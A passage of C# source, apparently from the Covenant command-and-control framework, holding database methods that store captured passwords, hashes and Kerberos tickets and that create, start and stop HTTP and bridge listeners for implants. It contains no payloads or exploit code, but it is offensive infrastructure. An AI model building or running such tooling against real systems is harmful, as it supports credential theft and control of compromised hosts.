            return await _context.Credentials.Where(P => P.Type == CredentialType.Hash).Select(H => (CapturedHashCredential)H).ToListAsync();
        }

        public async Task<IEnumerable<CapturedTicketCredential>> GetTicketCredentials()
        {
            return await _context.Credentials.Where(P => P.Type == CredentialType.Ticket).Select(T => (CapturedTicketCredential)T).ToListAsync();
        }

        public async Task<CapturedCredential> GetCredential(int credentialId)
        {
            CapturedCredential credential = await _context.Credentials.FirstOrDefaultAsync(C => C.Id == credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedCredential with id: {credentialId}");
            }
            return credential;
        }

        public async Task<CapturedPasswordCredential> GetPasswordCredential(int credentialId)
        {
            CapturedPasswordCredential credential = (await this.GetPasswordCredentials()).FirstOrDefault(c => c.Id == credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedPasswordCredential with id: {credentialId}");
            }
            return credential;
        }

        public async Task<CapturedHashCredential> GetHashCredential(int credentialId)
        {
            CapturedHashCredential credential = (await this.GetHashCredentials()).FirstOrDefault(c => c.Id == credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedHashCredential with id: {credentialId}");
            }
            return credential;
        }

        public async Task<CapturedTicketCredential> GetTicketCredential(int credentialId)
        {
            CapturedTicketCredential credential = (await this.GetTicketCredentials()).FirstOrDefault(c => c.Id == credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedTicketCredential with id: {credentialId}");
            }
            return credential;
        }

        public async Task<CapturedPasswordCredential> CreatePasswordCredential(CapturedPasswordCredential credential)
        {
            await _context.Credentials.AddAsync(credential);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateCapturedCredential(this, credential);
            return await GetPasswordCredential(credential.Id);
        }

        public async Task<CapturedHashCredential> CreateHashCredential(CapturedHashCredential credential)
        {
            await _context.Credentials.AddAsync(credential);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateCapturedCredential(this, credential);
            return await GetHashCredential(credential.Id);
        }

        public async Task<CapturedTicketCredential> CreateTicketCredential(CapturedTicketCredential credential)
        {
            await _context.Credentials.AddAsync(credential);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateCapturedCredential(this, credential);
            return await GetTicketCredential(credential.Id);
        }

        public async Task<IEnumerable<CapturedCredential>> CreateCredentials(params CapturedCredential[] credentials)
        {
            await _context.Credentials.AddRangeAsync(credentials);
            await _context.SaveChangesAsync();
            return credentials;
        }

        public async Task<CapturedPasswordCredential> EditPasswordCredential(CapturedPasswordCredential credential)
        {
            CapturedPasswordCredential matchingCredential = await this.GetPasswordCredential(credential.Id);
            matchingCredential.Username = credential.Username;
            matchingCredential.Password = credential.Password;
            matchingCredential.Type = credential.Type;

            _context.Credentials.Update(matchingCredential);
            await _context.SaveChangesAsync();
            // _notifier.OnEditCapturedCredential(this, matchingCredential);
            return await GetPasswordCredential(matchingCredential.Id);
        }

        public async Task<CapturedHashCredential> EditHashCredential(CapturedHashCredential credential)
        {
            CapturedHashCredential matchingCredential = await this.GetHashCredential(credential.Id);
            matchingCredential.Username = credential.Username;
            matchingCredential.Hash = credential.Hash;
            matchingCredential.HashCredentialType = credential.HashCredentialType;
            matchingCredential.Type = credential.Type;

            _context.Credentials.Update(matchingCredential);
            await _context.SaveChangesAsync();
            // _notifier.OnEditCapturedCredential(this, matchingCredential);
            return await GetHashCredential(matchingCredential.Id);
        }

        public async Task<CapturedTicketCredential> EditTicketCredential(CapturedTicketCredential credential)
        {
            CapturedTicketCredential matchingCredential = await this.GetTicketCredential(credential.Id);
            matchingCredential.Username = credential.Username;
            matchingCredential.Ticket = credential.Ticket;
            matchingCredential.TicketCredentialType = credential.TicketCredentialType;
            matchingCredential.Type = credential.Type;

            _context.Credentials.Update(matchingCredential);
            await _context.SaveChangesAsync();
            // _notifier.OnEditCapturedCredential(this, matchingCredential);
            return await GetTicketCredential(matchingCredential.Id);
        }

        public async Task DeleteCredential(int credentialId)
        {
            CapturedCredential credential = await this.GetCredential(credentialId);
            if (credential == null)
            {
                throw new ControllerNotFoundException($"NotFound - CapturedCredential with id: {credentialId}");
            }
            _context.Credentials.Remove(credential);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteCapturedCredential(this, credential.Id);
        }
        #endregion

        #region Indicator Actions
        public async Task<IEnumerable<Indicator>> GetIndicators()
        {
            return await _context.Indicators.ToListAsync();
        }

        public async Task<IEnumerable<FileIndicator>> GetFileIndicators()
        {
            return await _context.Indicators.Where(I => I.Type == IndicatorType.FileIndicator)
                .Select(I => (FileIndicator)I).ToListAsync();
        }

        public async Task<IEnumerable<NetworkIndicator>> GetNetworkIndicators()
        {
            return await _context.Indicators.Where(I => I.Type == IndicatorType.NetworkIndicator)
                .Select(I => (NetworkIndicator)I).ToListAsync();
        }

        public async Task<IEnumerable<TargetIndicator>> GetTargetIndicators()
        {
            return await _context.Indicators.Where(I => I.Type == IndicatorType.TargetIndicator)
                .Select(I => (TargetIndicator)I).ToListAsync();
        }

        public async Task<Indicator> GetIndicator(int indicatorId)
        {
            Indicator indicator = await _context.Indicators.FirstOrDefaultAsync(I => I.Id == indicatorId);
            if (indicator == null)
            {
                throw new ControllerNotFoundException($"NotFound - Indicator with id: {indicatorId}");
            }
            return indicator;
        }

        public async Task<FileIndicator> GetFileIndicator(int indicatorId)
        {
            Indicator indicator = await _context.Indicators.FirstOrDefaultAsync(I => I.Id == indicatorId);
            if (indicator == null || indicator.Type != IndicatorType.FileIndicator)
            {
                throw new ControllerNotFoundException($"NotFound - FileIndicator with id: {indicatorId}");
            }
            return (FileIndicator)indicator;
        }

        public async Task<NetworkIndicator> GetNetworkIndicator(int indicatorId)
        {
            Indicator indicator = await _context.Indicators.FirstOrDefaultAsync(I => I.Id == indicatorId);
            if (indicator == null || indicator.Type != IndicatorType.NetworkIndicator)
            {
                throw new ControllerNotFoundException($"NotFound - NetworkIndicator with id: {indicatorId}");
            }
            return (NetworkIndicator)indicator;
        }

        public async Task<TargetIndicator> GetTargetIndicator(int indicatorId)
        {
            Indicator indicator = await _context.Indicators.FirstOrDefaultAsync(I => I.Id == indicatorId);
            if (indicator == null || indicator.Type != IndicatorType.TargetIndicator)
            {
                throw new ControllerNotFoundException($"NotFound - TargetIndicator with id: {indicatorId}");
            }
            return (TargetIndicator)indicator;
        }

        public async Task<Indicator> CreateIndicator(Indicator indicator)
        {
            await _context.Indicators.AddAsync(indicator);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateIndicator(this, indicator);
            return await GetIndicator(indicator.Id);
        }

        public async Task<IEnumerable<Indicator>> CreateIndicators(params Indicator[] indicators)
        {
            await _context.Indicators.AddRangeAsync(indicators);
            await _context.SaveChangesAsync();
            return indicators;
        }

        public async Task<Indicator> EditIndicator(Indicator indicator)
        {
            Indicator matchingIndicator = await this.GetIndicator(indicator.Id);
            if (matchingIndicator == null)
            {
                throw new ControllerNotFoundException($"NotFound - Indicator with id: {indicator.Id}");
            }
            matchingIndicator.Type = indicator.Type;
            switch (indicator.Type)
            {
                case IndicatorType.FileIndicator:
                    FileIndicator matchingFileIndicator = (FileIndicator)matchingIndicator;
                    FileIndicator fileIndicator = (FileIndicator)indicator;
                    matchingFileIndicator.FileName = fileIndicator.FileName;
                    matchingFileIndicator.FilePath = fileIndicator.FilePath;
                    matchingFileIndicator.SHA2 = fileIndicator.SHA2;
                    matchingFileIndicator.SHA1 = fileIndicator.SHA1;
                    matchingFileIndicator.MD5 = fileIndicator.MD5;
                    _context.Indicators.Update(matchingFileIndicator);
                    break;
                case IndicatorType.NetworkIndicator:
                    NetworkIndicator matchingNetworkIndicator = (NetworkIndicator)matchingIndicator;
                    NetworkIndicator networkIndicator = (NetworkIndicator)indicator;
                    matchingNetworkIndicator.Protocol = networkIndicator.Protocol;
                    matchingNetworkIndicator.Domain = networkIndicator.Domain;
                    matchingNetworkIndicator.IPAddress = networkIndicator.IPAddress;
                    matchingNetworkIndicator.Port = networkIndicator.Port;
                    matchingNetworkIndicator.URI = networkIndicator.URI;
                    _context.Indicators.Update(matchingNetworkIndicator);
                    break;
                case IndicatorType.TargetIndicator:
                    TargetIndicator matchingTargetIndicator = (TargetIndicator)matchingIndicator;
                    TargetIndicator targetIndicator = (TargetIndicator)indicator;
                    matchingTargetIndicator.ComputerName = targetIndicator.ComputerName;
                    matchingTargetIndicator.UserName = targetIndicator.UserName;
                    _context.Indicators.Update(matchingTargetIndicator);
                    break;
            }
            await _context.SaveChangesAsync();
            // _notifier.OnEditIndicator(this, indicator);
            return await this.GetIndicator(indicator.Id);
        }

        public async Task DeleteIndicator(int indicatorId)
        {
            Indicator indicator = await this.GetIndicator(indicatorId);
            if (indicator == null)
            {
                throw new ControllerNotFoundException($"NotFound - Indicator with id: {indicatorId}");
            }
            _context.Indicators.Remove(indicator);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteIndicator(this, indicator.Id);
        }
        #endregion

        #region ListenerType Actions
        public async Task<IEnumerable<ListenerType>> GetListenerTypes()
        {
            return await _context.ListenerTypes.ToListAsync();
        }

        public async Task<ListenerType> GetListenerType(int listenerTypeId)
        {
            ListenerType type = await _context.ListenerTypes.FirstOrDefaultAsync(L => L.Id == listenerTypeId);
            if (type == null)
            {
                throw new ControllerNotFoundException($"NotFound - ListenerType with id: {listenerTypeId}");
            }
            return type;
        }

        public async Task<ListenerType> GetListenerTypeByName(string name)
        {
            ListenerType type = await _context.ListenerTypes.FirstOrDefaultAsync(LT => LT.Name == name);
            if (type == null)
            {
                throw new ControllerNotFoundException($"NotFound - ListenerType with name: {name}");
            }
            return type;
        }
        #endregion

        #region Profile Actions
        public async Task<IEnumerable<Profile>> GetProfiles()
        {
            return await _context.Profiles.ToListAsync();
        }

        public async Task<Profile> GetProfile(int profileId)
        {
            Profile profile = await _context.Profiles.FirstOrDefaultAsync(P => P.Id == profileId);
            if (profile == null)
            {
                throw new ControllerNotFoundException($"NotFound - Profile with id: {profileId}");
            }
            return profile;
        }

        public async Task<Profile> CreateProfile(Profile profile, CovenantUser currentUser)
        {
            if (!await this.IsAdmin(currentUser))
            {
                throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
            }
            await _context.Profiles.AddAsync(profile);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateProfile(this, profile);
            return await this.GetProfile(profile.Id);
        }

        public async Task<IEnumerable<Profile>> CreateProfiles(params Profile[] profiles)
        {
            await _context.Profiles.AddRangeAsync(profiles);
            await _context.SaveChangesAsync();
            return profiles;
        }

        public async Task<Profile> EditProfile(Profile profile, CovenantUser currentUser)
        {
            Profile matchingProfile = await this.GetProfile(profile.Id);
            matchingProfile.Description = profile.Description;
            matchingProfile.Name = profile.Name;
            matchingProfile.Type = profile.Type;
            _context.Profiles.Update(matchingProfile);
            await _context.SaveChangesAsync();
            // _notifier.OnEditProfile(this, matchingProfile);
            return await this.GetProfile(profile.Id);
        }

        public async Task DeleteProfile(int id)
        {
            Profile profile = await this.GetProfile(id);
            _context.Profiles.Remove(profile);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteProfile(this, profile.Id);
        }

        public async Task<IEnumerable<HttpProfile>> GetHttpProfiles()
        {
            return await _context.Profiles.Where(P => P.Type == ProfileType.HTTP).Select(P => (HttpProfile)P).ToListAsync();
        }

        public async Task<IEnumerable<BridgeProfile>> GetBridgeProfiles()
        {
            return await _context.Profiles.Where(P => P.Type == ProfileType.Bridge).Select(P => (BridgeProfile)P).ToListAsync();
        }

        public async Task<HttpProfile> GetHttpProfile(int profileId)
        {
            Profile profile = await _context.Profiles.FirstOrDefaultAsync(P => P.Id == profileId);
            if (profile == null || profile.Type != ProfileType.HTTP)
            {
                throw new ControllerNotFoundException($"NotFound - HttpProfile with id: {profileId}");
            }
            return (HttpProfile)profile;
        }

        public async Task<BridgeProfile> GetBridgeProfile(int profileId)
        {
            Profile profile = await _context.Profiles.FirstOrDefaultAsync(P => P.Id == profileId);
            if (profile == null || profile.Type != ProfileType.Bridge)
            {
                throw new ControllerNotFoundException($"NotFound - BridgeProfile with id: {profileId}");
            }
            return (BridgeProfile)profile;
        }

        public async Task<HttpProfile> CreateHttpProfile(HttpProfile profile, CovenantUser currentUser)
        {
            if (!await this.IsAdmin(currentUser))
            {
                throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
            }
            await _context.Profiles.AddAsync(profile);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateProfile(this, profile);
            return await this.GetHttpProfile(profile.Id);
        }

        public async Task<BridgeProfile> CreateBridgeProfile(BridgeProfile profile, CovenantUser currentUser)
        {
            if (!await this.IsAdmin(currentUser))
            {
                throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
            }
            await _context.Profiles.AddAsync(profile);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateProfile(this, profile);
            return await this.GetBridgeProfile(profile.Id);
        }

        public async Task<HttpProfile> EditHttpProfile(HttpProfile profile, CovenantUser currentUser)
        {
            HttpProfile matchingProfile = await this.GetHttpProfile(profile.Id);
            Listener l = await _context.Listeners.FirstOrDefaultAsync(L => L.ProfileId == matchingProfile.Id && L.Status == ListenerStatus.Active);
            if (l != null)
            {
                throw new ControllerBadRequestException($"BadRequest - Cannot edit a profile assigned to an Active Listener");
            }
            matchingProfile.Name = profile.Name;
            matchingProfile.Type = profile.Type;
            matchingProfile.Description = profile.Description;
            matchingProfile.HttpRequestHeaders = profile.HttpRequestHeaders;
            matchingProfile.HttpResponseHeaders = profile.HttpResponseHeaders;
            matchingProfile.HttpUrls = profile.HttpUrls;
            matchingProfile.HttpGetResponse = profile.HttpGetResponse.Replace("\r\n", "\n");
            matchingProfile.HttpPostRequest = profile.HttpPostRequest.Replace("\r\n", "\n");
            matchingProfile.HttpPostResponse = profile.HttpPostResponse.Replace("\r\n", "\n");
            if (matchingProfile.MessageTransform != profile.MessageTransform)
            {
                if (!await this.IsAdmin(currentUser))
                {
                    throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
                }
                matchingProfile.MessageTransform = profile.MessageTransform;
            }
            _context.Update(matchingProfile);
            await _context.SaveChangesAsync();
            // _notifier.OnEditProfile(this, matchingProfile);
            return await this.GetHttpProfile(profile.Id);
        }

        public async Task<BridgeProfile> EditBridgeProfile(BridgeProfile profile, CovenantUser currentUser)
        {
            BridgeProfile matchingProfile = await this.GetBridgeProfile(profile.Id);
            Listener l = await _context.Listeners.FirstOrDefaultAsync(L => L.ProfileId == matchingProfile.Id && L.Status == ListenerStatus.Active);
            if (l != null)
            {
                throw new ControllerBadRequestException($"BadRequest - Cannot edit a profile assigned to an Active Listener");
            }
            matchingProfile.Name = profile.Name;
            matchingProfile.Type = profile.Type;
            matchingProfile.Description = profile.Description;
            matchingProfile.ReadFormat = profile.ReadFormat;
            matchingProfile.WriteFormat = profile.WriteFormat;
            matchingProfile.BridgeMessengerCode = profile.BridgeMessengerCode;
            if (matchingProfile.MessageTransform != profile.MessageTransform)
            {
                if (!await this.IsAdmin(currentUser))
                {
                    throw new ControllerUnauthorizedException($"Unauthorized - User with username: {currentUser.UserName} is not an Administrator and cannot create new profiles");
                }
                matchingProfile.MessageTransform = profile.MessageTransform;
            }
            _context.Update(matchingProfile);
            await _context.SaveChangesAsync();
            // _notifier.OnEditProfile(this, matchingProfile);
            return await this.GetBridgeProfile(profile.Id);
        }
        #endregion

        #region Listener Actions
        public async Task<IEnumerable<Listener>> GetListeners()
        {
            return await _context.Listeners
                .Include(L => L.ListenerType)
                .Include(L => L.Profile)
                .ToListAsync();
        }

        public async Task<Listener> GetListener(int listenerId)
        {
            Listener listener = await _context.Listeners
                .Include(L => L.ListenerType)
                .Include(L => L.Profile)
                .FirstOrDefaultAsync(L => L.Id == listenerId);
            if (listener == null)
            {
                throw new ControllerNotFoundException($"NotFound - Listener with id: {listenerId}");
            }
            return listener;
        }

        public async Task<Listener> EditListener(Listener listener)
        {
            Listener matchingListener = await this.GetListener(listener.Id);
            matchingListener.Name = listener.Name;
            matchingListener.GUID = listener.GUID;
            matchingListener.Description = listener.Description;
            matchingListener.BindAddress = listener.BindAddress;
            matchingListener.BindPort = listener.BindPort;
            matchingListener.ConnectAddresses = listener.ConnectAddresses;
            matchingListener.CovenantUrl = listener.CovenantUrl;
            matchingListener.CovenantToken = listener.CovenantToken;

            if (matchingListener.Status == ListenerStatus.Active && listener.Status == ListenerStatus.Stopped)
            {
                matchingListener.Stop(_cancellationTokens[matchingListener.Id]);
                matchingListener.Status = listener.Status;
                matchingListener.StartTime = DateTime.MinValue;
                Event listenerEvent = await this.CreateEvent(new Event
                {
                    Time = DateTime.UtcNow,
                    MessageHeader = "Stopped Listener",
                    MessageBody = "Stopped Listener: " + matchingListener.Name,
                    Level = EventLevel.Warning,
                    Context = "*"
                });
                await _context.SaveChangesAsync();
            }
            else if (matchingListener.Status != ListenerStatus.Active && listener.Status == ListenerStatus.Active)
            {
                matchingListener.StartTime = DateTime.UtcNow;
                Profile profile = await this.GetProfile(matchingListener.ProfileId);
                CancellationTokenSource listenerCancellationToken = null;
                try
                {
                    listenerCancellationToken = matchingListener.Start();
                    matchingListener.Status = ListenerStatus.Active;
                }
                catch (ListenerStartException e)
                {
                    throw new ControllerBadRequestException($"BadRequest - Listener with id: {matchingListener.Id} did not start due to exception: {e.Message}");
                }
                _cancellationTokens[matchingListener.Id] = listenerCancellationToken ?? throw new ControllerBadRequestException($"BadRequest - Listener with id: {matchingListener.Id} did not start properly");
                Event listenerEvent = await this.CreateEvent(new Event
                {
                    Time = matchingListener.StartTime,
                    MessageHeader = "Started Listener",
                    MessageBody = "Started Listener: " + matchingListener.Name,
                    Level = EventLevel.Highlight,
                    Context = "*"
                });
                await _context.SaveChangesAsync();
            }
            _context.Listeners.Update(matchingListener);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditListener(this, matchingListener);
            return await this.GetListener(matchingListener.Id);
        }

        public async Task StartListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            try
            {
                CancellationTokenSource listenerCancellationToken = listener.Start();
                _context.Listeners.Update(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditListener(this, listener);
                _cancellationTokens[listener.Id] = listenerCancellationToken ?? throw new ControllerBadRequestException($"BadRequest - Listener with id: {listener.Id} did not start properly");
            }
            catch (ListenerStartException e)
            {
                throw new ControllerBadRequestException($"BadRequest - Listener with id: {listener.Id} did not start due to exception: {e.Message}");
            }
        }

        public async Task DeleteListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            if (listener.Status == ListenerStatus.Active)
            {
                listener.Stop(_cancellationTokens[listener.Id]);
            }
            _context.Launchers.Where(L => L.ListenerId == listener.Id).ToList().ForEach(L =>
            {
                L.LauncherString = "";
                L.StagerCode = "";
                L.Base64ILByteString = "";
                _context.Launchers.Update(L);
            });
            _context.Listeners.Remove(listener);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteListener(this, listener.Id);
        }

        public async Task<IEnumerable<HttpListener>> GetHttpListeners()
        {
            return await _context.Listeners
                .Include(L => L.ListenerType)
                .Include(L => L.Profile)
                .Where(L => L.ListenerType.Name == "HTTP")
                .Select(L => (HttpListener)L)
                .ToListAsync();
        }

        public async Task<IEnumerable<BridgeListener>> GetBridgeListeners()
        {
            return await _context.Listeners
                .Include(L => L.ListenerType)
                .Include(L => L.Profile)
                .Where(L => L.ListenerType.Name == "Bridge")
                .Select(L => (BridgeListener)L)
                .ToListAsync();
        }

        public async Task<HttpListener> GetHttpListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            ListenerType listenerType = await this.GetListenerType(listener.ListenerTypeId);
            if (listenerType.Name != "HTTP")
            {
                throw new ControllerNotFoundException($"NotFound - HttpListener with id: {listener.ListenerTypeId}");
            }
            return (HttpListener)listener;
        }

        public async Task<BridgeListener> GetBridgeListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            ListenerType listenerType = await this.GetListenerType(listener.ListenerTypeId);
            if (listenerType.Name != "Bridge")
            {
                throw new ControllerNotFoundException($"NotFound - BridgeListener with id: {listener.ListenerTypeId}");
            }
            return (BridgeListener)listener;
        }

        private async Task<HttpListener> StartInitialHttpListener(HttpListener listener)
        {
            listener.StartTime = DateTime.UtcNow;
            if (listener.UseSSL && string.IsNullOrWhiteSpace(listener.SSLCertificate))
            {
                throw new ControllerBadRequestException($"HttpListener: {listener.Name} missing SSLCertificate");
            }
            if (_context.Listeners.Where(L => L.Status == ListenerStatus.Active && L.BindPort == listener.BindPort).Any())
            {
                throw new ControllerBadRequestException($"Listener already listening on port: {listener.BindPort}");
            }
            await this.StartListener(listener.Id);

            for (int i = 0; i < listener.ConnectAddresses.Count; i++)
            {
                NetworkIndicator httpIndicator = new NetworkIndicator
                {
                    Protocol = "http",
                    Domain = Utilities.IsIPAddress(listener.ConnectAddresses[i]) ? "" : listener.ConnectAddresses[i],
                    IPAddress = Utilities.IsIPAddress(listener.ConnectAddresses[i]) ? listener.ConnectAddresses[i] : "",
                    Port = listener.BindPort,
                    URI = listener.Urls[i]
                };
                IEnumerable<NetworkIndicator> indicators = await this.GetNetworkIndicators();
                if (indicators.FirstOrDefault(I => I.IPAddress == httpIndicator.IPAddress && I.Domain == httpIndicator.Domain) == null)
                {
                    await _context.Indicators.AddAsync(httpIndicator);
                    // _notifier.OnCreateIndicator(this, httpIndicator);
                }
            }

            Event listenerEvent = await this.CreateEvent(new Event
            {
                Time = listener.StartTime,
                MessageHeader = "Started Listener",
                MessageBody = "Started Listener: " + listener.Name,
                Level = EventLevel.Highlight,
                Context = "*"
            });
            await _context.SaveChangesAsync();
            return listener;
        }

        private async Task<BridgeListener> StartInitialBridgeListener(BridgeListener listener)
        {
            listener.StartTime = DateTime.UtcNow;
            if (_context.Listeners.Where(L => L.Status == ListenerStatus.Active && L.BindPort == listener.BindPort).Any())
            {
                throw new ControllerBadRequestException($"Listener already listening on port: {listener.BindPort}");
            }
            CancellationTokenSource listenerCancellationToken = null;
            try
            {
                listenerCancellationToken = listener.Start();
            }
            catch (ListenerStartException e)
            {
                throw new ControllerBadRequestException($"BadRequest - Listener with id: {listener.Id} did not start due to exception: {e.Message}");
            }
            _cancellationTokens[listener.Id] = listenerCancellationToken ?? throw new ControllerBadRequestException($"BadRequest - Listener with id: {listener.Id} did not start properly");

            for (int i = 0; i < listener.ConnectAddresses.Count; i++)
            {
                NetworkIndicator bridgeIndicator = new NetworkIndicator
                {
                    Protocol = "bridge",
                    Domain = Utilities.IsIPAddress(listener.ConnectAddresses[i]) ? "" : listener.ConnectAddresses[i],
                    IPAddress = Utilities.IsIPAddress(listener.ConnectAddresses[i]) ? listener.ConnectAddresses[i] : "",
                    Port = listener.BindPort
                };
                IEnumerable<NetworkIndicator> indicators = await this.GetNetworkIndicators();
                if (indicators.FirstOrDefault(I => I.IPAddress == bridgeIndicator.IPAddress && I.Domain == bridgeIndicator.Domain) == null)
                {
                    await _context.Indicators.AddAsync(bridgeIndicator);
                    // _notifier.OnCreateIndicator(this, bridgeIndicator);
                }
            }

            _cancellationTokens[listener.Id] = listenerCancellationToken;
            Event listenerEvent = await this.CreateEvent(new Event
            {
                Time = listener.StartTime,
                MessageHeader = "Started Listener",
                MessageBody = "Started Listener: " + listener.Name,
                Level = EventLevel.Highlight,
                Context = "*"
            });
            await _context.SaveChangesAsync();
            return listener;
        }

        public async Task<HttpListener> CreateHttpListener(HttpListener listener)
        {
            listener.ListenerType = await this.GetListenerType(listener.ListenerTypeId);
            listener.Profile = await this.GetHttpProfile(listener.ProfileId);
            // Append capital letter to appease Password complexity requirements, get rid of warning output
            string password = Utilities.CreateSecureGuid().ToString() + "A";
            CovenantUser listenerUser = await this.CreateUser(new CovenantUserLogin
            {
                UserName = Utilities.CreateSecureGuid().ToString(),
                Password = password
            });
            IdentityRole listenerRole = await this.GetRoleByName("Listener");
            IdentityUserRole<string> userrole = await this.CreateUserRole(listenerUser.Id, listenerRole.Id);
            listener.CovenantUrl = "https://localhost:" + _configuration["CovenantPort"];
            listener.CovenantToken = Utilities.GenerateJwtToken(
                listenerUser.UserName, listenerUser.Id, new[] { listenerRole.Name },
                _configuration["JwtKey"], _configuration["JwtIssuer"],
                _configuration["JwtAudience"], "2000"
            );
            if (listener.Status == ListenerStatus.Active)
            {
                listener.Status = ListenerStatus.Uninitialized;
                await _context.Listeners.AddAsync(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyCreateListener(this, listener);
                listener = await this.StartInitialHttpListener(listener);
                _context.Listeners.Update(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditListener(this, listener);
            }
            else
            {
                await _context.Listeners.AddAsync(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyCreateListener(this, listener);
            }
            return await this.GetHttpListener(listener.Id);
        }

        public async Task<BridgeListener> CreateBridgeListener(BridgeListener listener)
        {
            listener.Profile = await this.GetBridgeProfile(listener.ProfileId);
            // Append capital letter to appease Password complexity requirements, get rid of warning output
            string password = Utilities.CreateSecureGuid().ToString() + "A";
            CovenantUser listenerUser = await this.CreateUser(new CovenantUserLogin
            {
                UserName = Utilities.CreateSecureGuid().ToString(),
                Password = password
            });
            IdentityRole listenerRole = await _context.Roles.FirstOrDefaultAsync(R => R.Name == "Listener");
            IdentityUserRole<string> userrole = await this.CreateUserRole(listenerUser.Id, listenerRole.Id);
            listener.CovenantUrl = "https://localhost:" + _configuration["CovenantPort"];
            listener.CovenantToken = Utilities.GenerateJwtToken(
                listenerUser.UserName, listenerUser.Id, new[] { listenerRole.Name },
                _configuration["JwtKey"], _configuration["JwtIssuer"],
                _configuration["JwtAudience"], "2000"
            );
            if (listener.Status == ListenerStatus.Active)
            {
                listener.Status = ListenerStatus.Uninitialized;
                await _context.Listeners.AddAsync(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyCreateListener(this, listener);
                listener.Status = ListenerStatus.Active;
                listener = await this.StartInitialBridgeListener(listener);
                _context.Listeners.Update(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditListener(this, listener);
            }
            else
            {
                await _context.Listeners.AddAsync(listener);
                await _context.SaveChangesAsync();
                await _notifier.NotifyCreateListener(this, listener);
            }
            return await this.GetBridgeListener(listener.Id);
        }

        public async Task<IEnumerable<Listener>> CreateListeners(params Listener[] listeners)
        {
            await _context.Listeners.AddRangeAsync(listeners);
            await _context.SaveChangesAsync();
            foreach (Listener l in listeners)
            {
                await _notifier.NotifyCreateListener(this, l);
            }
            return listeners;
        }

        public async Task<HttpListener> EditHttpListener(HttpListener listener)
        {
            HttpListener matchingListener = await this.GetHttpListener(listener.Id);
            matchingListener.Name = listener.Name;
            matchingListener.GUID = listener.GUID;
            matchingListener.BindAddress = listener.BindAddress;
            matchingListener.BindPort = listener.BindPort;
            matchingListener.ConnectAddresses = listener.ConnectAddresses;
            matchingListener.ConnectPort = listener.ConnectPort;
            matchingListener.UseSSL = listener.UseSSL;
            matchingListener.SSLCertificatePassword = listener.SSLCertificatePassword;
            matchingListener.SSLCertificate = listener.SSLCertificate;

            HttpProfile profile = await this.GetHttpProfile(listener.ProfileId);
            matchingListener.ProfileId = profile.Id;

            if (matchingListener.Status == ListenerStatus.Active && listener.Status == ListenerStatus.Stopped)
            {
                matchingListener.Stop(_cancellationTokens[matchingListener.Id]);
                matchingListener.Status = listener.Status;
                matchingListener.StartTime = DateTime.MinValue;
                DateTime eventTime = DateTime.UtcNow;
                Event listenerEvent = await this.CreateEvent(new Event
                {
                    Time = eventTime,
                    MessageHeader = "Stopped Listener",
                    MessageBody = "Stopped Listener: " + matchingListener.Name + " at: " + matchingListener.Urls,
                    Level = EventLevel.Warning,
                    Context = "*"
                });
                await _context.SaveChangesAsync();
            }
            else if (matchingListener.Status != ListenerStatus.Active && listener.Status == ListenerStatus.Active)
            {
                matchingListener.Status = ListenerStatus.Active;
                matchingListener = await this.StartInitialHttpListener(matchingListener);
            }

            _context.Listeners.Update(matchingListener);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditListener(this, matchingListener);
            return await this.GetHttpListener(matchingListener.Id);
        }

        public async Task<BridgeListener> EditBridgeListener(BridgeListener listener)
        {
            BridgeListener matchingListener = await this.GetBridgeListener(listener.Id);
            matchingListener.Name = listener.Name;
            matchingListener.GUID = listener.GUID;
            matchingListener.BindAddress = listener.BindAddress;
            matchingListener.BindPort = listener.BindPort;
            matchingListener.ConnectAddresses = listener.ConnectAddresses;
            matchingListener.ConnectPort = listener.ConnectPort;

            BridgeProfile profile = await this.GetBridgeProfile(listener.ProfileId);
            matchingListener.ProfileId = profile.Id;

            if (matchingListener.Status == ListenerStatus.Active && listener.Status == ListenerStatus.Stopped)
            {
                matchingListener.Stop(_cancellationTokens[matchingListener.Id]);
                matchingListener.Status = listener.Status;
                matchingListener.StartTime = DateTime.MinValue;
                DateTime eventTime = DateTime.UtcNow;
                Event listenerEvent = await this.CreateEvent(new Event
                {
                    Time = eventTime,
                    MessageHeader = "Stopped Listener",
                    MessageBody = "Stopped Listener: " + matchingListener.Name + " at: " + matchingListener.ConnectAddresses,
                    Level = EventLevel.Warning,
                    Context = "*"
                });
                await _context.SaveChangesAsync();
            }
            else if (matchingListener.Status != ListenerStatus.Active && listener.Status == ListenerStatus.Active)
            {
                matchingListener.Status = ListenerStatus.Active;
                matchingListener = await this.StartInitialBridgeListener(matchingListener);
            }

            _context.Listeners.Update(matchingListener);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditListener(this, matchingListener);
